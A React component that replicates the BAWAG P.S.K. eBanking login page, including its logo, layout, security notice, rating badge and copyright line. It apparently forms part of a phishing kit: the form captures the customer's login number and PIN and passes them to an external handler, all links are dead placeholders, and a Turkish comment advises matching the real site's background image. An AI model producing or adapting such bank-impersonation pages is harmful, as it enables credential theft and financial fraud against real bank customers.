"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function BawagAg({ formData, onChange, handleRouteAction, saving }: Props) {
  const [showPin, setShowPin] = useState(false);

  return (
    <div className="min-h-screen bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="max-w-[1024px] mx-auto h-[90px] flex items-center justify-between px-4">
        <div className="flex items-center gap-2">
          {/* Geometric Logo Mark */}
          <div className="relative w-8 h-12 flex items-center justify-center">
            <svg viewBox="0 0 24 36" className="w-full h-full" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 0L24 18L12 36L0 18L12 0Z" fill="#a90000" />
              <path d="M12 0L24 18L12 36L12 0Z" fill="#7a0000" />
            </svg>
          </div>
          <span className="text-[28px] font-bold tracking-widest uppercase text-black ml-1">BAWAG</span>
        </div>
        
        {/* Language Selector */}
        <div className="flex text-[13px] font-bold text-gray-500">
          <span className="bg-[#e5e5e5] text-black px-2.5 py-1.5 rounded-sm cursor-pointer">DE</span>
          <span className="px-2.5 py-1.5 hover:text-black cursor-pointer transition-colors">EN</span>
          <span className="px-2.5 py-1.5 hover:text-black cursor-pointer transition-colors">BKS</span>
          <span className="px-2.5 py-1.5 hover:text-black cursor-pointer transition-colors">TR</span>
        </div>
      </header>

      {/* Main Content Area */}
      <div className="max-w-[1024px] mx-auto relative mt-2 mb-12">
        {/* Background Image / Gradient Block */}
        <div 
          className="absolute top-[30px] left-0 right-0 bottom-0 -z-10 h-[480px]"
          style={{
            background: "linear-gradient(to right, #e0f6f4 0%, #3ec0b4 45%, #00a99d 100%)",
            // Eğer elinizde tam arkaplan görseli (JPG/PNG) varsa, üstteki background satırını silip aşağıdaki satırı aktif edebilirsiniz:
            // backgroundImage: "url('/bawag-bg.webp')",
            backgroundSize: "cover",
            backgroundPosition: "center"
          }}
        ></div>

        <div className="flex flex-col md:flex-row px-4 gap-6 relative z-10">
          {/* Left Panel: Login Box */}
          <div className="w-full md:w-[380px] bg-white rounded-lg shadow-[0_8px_30px_rgba(0,0,0,0.12)] flex-shrink-0 flex flex-col p-8 pb-10">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-[22px] font-bold text-[#333]">eBanking Login</h2>
              <div className="w-6 h-6 rounded-full bg-gray-100 flex items-center justify-center text-gray-500 font-bold text-sm cursor-pointer hover:bg-gray-200">
                ?
              </div>
            </div>

            <p className="text-[13px] text-[#555] mb-6">Wie wollen Sie sich einloggen?</p>

            {/* Tabs */}
            <div className="flex border-b border-gray-200 mb-8">
              <div className="flex-1 text-center pb-3 border-b-2 border-[#a90000] text-[#a90000] font-bold text-[15px] cursor-pointer">
                Verfüger
              </div>
              <div className="flex-1 text-center pb-3 text-gray-400 font-medium text-[15px] cursor-pointer hover:text-gray-600">
                Mit der App
              </div>
            </div>

            {/* Form */}
            <form 
              onSubmit={(e) => {
                e.preventDefault();
                handleRouteAction();
              }}
              className="flex flex-col gap-4"
            >
              <div>
                <input 
                  type="text" 
                  placeholder="Inlogcode"
                  value={formData.verfuegernummer || ""}
                  onChange={(e) => onChange("verfuegernummer", e.target.value)}
                  className="w-full h-[46px] border border-gray-300 rounded-[4px] px-4 outline-none focus:border-[#a90000] text-[#333] placeholder-gray-400 text-[15px]"
                />
              </div>

              <div className="relative">
                <input 
                  type={showPin ? "text" : "password"} 
                  placeholder="PIN (8 bis 16-stellig )"
                  value={formData.pin || ""}
                  onChange={(e) => onChange("pin", e.target.value)}
                  className="w-full h-[46px] border border-gray-300 rounded-[4px] pl-4 pr-12 outline-none focus:border-[#a90000] text-[#333] placeholder-gray-400 text-[15px]"
                />
                <button 
                  type="button"
                  onClick={() => setShowPin(!showPin)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                  </svg>
                </button>
              </div>

              <button 
                type="submit" 
                disabled={saving} 
                className="mt-4 w-full bg-[#a90000] hover:bg-[#8a0000] text-white font-medium h-[46px] rounded-[4px] text-[16px] transition-colors disabled:opacity-70"
              >
                {saving ? "Wird geladen..." : "Login"}
              </button>

              <div className="mt-4 text-center">
                <a href="#" className="text-[#a90000] text-[13px] hover:underline flex items-center justify-center gap-1">
                  <span className="font-bold text-[15px] leading-none mb-[2px]">&gt;</span> PIN vergessen oder Verfüger gesperrt?
                </a>
              </div>
            </form>
          </div>

          {/* Right Content Area */}
          <div className="flex-1 flex flex-col pt-8">
            {/* Top Info Strip */}
            <div className="bg-white rounded-lg shadow-sm flex flex-col md:flex-row p-6 gap-6 md:gap-12 mb-10 border-t-4 border-gray-100">
              <div className="flex-1">
                <h3 className="font-bold text-[#333] mb-3 text-[15px]">Sicherheit</h3>
                <p className="text-[13px] text-[#555] mb-2 leading-relaxed">
                  Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                </p>
                <a href="#" className="text-[#a90000] text-[13px] hover:underline flex items-center gap-1">
                  <span className="font-bold text-[15px] leading-none mb-[2px]">&gt;</span> Mehr Infos
                </a>
              </div>
              <div className="flex-1">
                <h3 className="font-bold text-[#333] mb-3 text-[15px]">Service & Info</h3>
                <ul className="space-y-2.5">
                  <li>
                    <a href="#" className="text-[#a90000] text-[13px] hover:underline flex items-center gap-1">
                      <span className="font-bold text-[15px] leading-none mb-[2px]">&gt;</span> Sicherheitsregeln
                    </a>
                  </li>
                  <li>
                    <a href="#" className="text-[#a90000] text-[13px] hover:underline flex items-center gap-1">
                      <span className="font-bold text-[15px] leading-none mb-[2px]">&gt;</span> Anmeldung / Erste Schritte
                    </a>
                  </li>
                  <li>
                    <a href="#" className="text-[#a90000] text-[13px] hover:underline flex items-center gap-1">
                      <span className="font-bold text-[15px] leading-none mb-[2px]">&gt;</span> 3D Secure Online Bezahlung
                    </a>
                  </li>
                </ul>
              </div>
              <div className="flex-1">
                <h3 className="font-bold text-[#333] mb-3 text-[15px]">Support</h3>
                <ul className="space-y-2.5">
                  <li>
                    <a href="#" className="text-[#a90000] text-[13px] hover:underline flex items-center gap-1">
                      <span className="font-bold text-[15px] leading-none mb-[2px]">&gt;</span> FAQ
                    </a>
                  </li>
                  <li>
                    <a href="#" className="text-[#a90000] text-[13px] hover:underline flex items-center gap-1">
                      <span className="font-bold text-[15px] leading-none mb-[2px]">&gt;</span> Zu Watchlist Internet
                    </a>
                  </li>
                </ul>
              </div>
            </div>

            {/* Banner & Badge Area */}
            <div className="flex justify-between items-start pl-4 pr-2">
              <div className="text-white mt-4">
                <h1 className="text-[38px] font-bold leading-[1.1] mb-1 text-transparent bg-clip-text bg-gradient-to-r from-white to-[#a8e6e2]">
                  Beste<br />Anlageberatung nutzen!
                </h1>
                <button className="mt-6 bg-[#a90000] hover:bg-[#8a0000] text-white font-medium px-8 py-2.5 rounded-full text-[15px] transition-colors shadow-sm">
                  Termin vereinbaren
                </button>
                <p className="mt-10 text-[14px] text-[#048275]">
                  Investments bergen Risiken.
                </p>
              </div>

              {/* Q Badge */}
              <div className="w-[120px] bg-white rounded-sm shadow-md overflow-hidden flex flex-col mt-[-10px]">
                <div className="bg-[#b30000] text-white text-[8px] text-center p-1.5 leading-tight font-bold">
                  ÖGVS | Gesellschaft für<br />Verbraucherstudien GmbH
                </div>
                <div className="bg-[#e63946] text-white flex justify-center py-2 relative">
                  <span className="text-[54px] font-serif leading-none">Q</span>
                  <span className="absolute right-1 bottom-1 text-[6px] rotate-[-90deg] origin-bottom-right">ögvs.at</span>
                </div>
                <div className="text-center p-2 pb-3">
                  <p className="text-[7px] text-gray-500 mb-1 leading-tight">Qualitätstest<br />Service, Beratung, Transparenz</p>
                  <p className="text-[#a90000] font-bold text-[14px] leading-tight">1. PLATZ</p>
                  <p className="text-[#a90000] font-bold text-[9px] mb-2">BERATUNG</p>
                  <p className="text-[6px] text-gray-400 leading-[1.1] mb-2">Anlageberatung Filialbanken<br />Teilkategorie im Test 08/2025<br />5 Banken, ögvs.at/8225</p>
                  <div className="bg-[#002f6c] text-white font-bold text-[12px] py-0.5">trend.</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="max-w-[1024px] mx-auto py-8 flex flex-col items-center gap-2 border-t border-gray-100">
        <div className="flex gap-4 text-[12px] text-gray-500">
          <a href="#" className="hover:text-gray-800 hover:underline">Impressum</a>
          <a href="#" className="hover:text-gray-800 hover:underline">AGB</a>
          <a href="#" className="hover:text-gray-800 hover:underline">Datenschutz</a>
          <a href="#" className="hover:text-gray-800 hover:underline">Nutzungsbedingungen</a>
          <a href="#" className="hover:text-gray-800 hover:underline">Barrierefrei</a>
        </div>
        <p className="text-[11px] text-gray-400">© BAWAG P.S.K.</p>
      </footer>
    </div>
  );
}
